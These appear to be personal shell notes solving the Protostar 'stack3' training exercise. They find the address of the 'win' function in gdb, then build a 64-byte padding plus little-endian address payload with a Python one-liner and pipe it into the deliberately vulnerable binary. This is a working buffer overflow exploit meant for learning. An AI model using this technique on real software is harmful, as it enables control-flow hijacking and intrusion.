#(gdb) print win
#$1 = {void (void)} 0x8048424 <win>
# 0x08048424

python -c 'print "A" * 64 + "\x24\x84\x04\x08"' > stack3_attack.txt

/opt/protostar/bin/stack3 < stack3_attack.txt



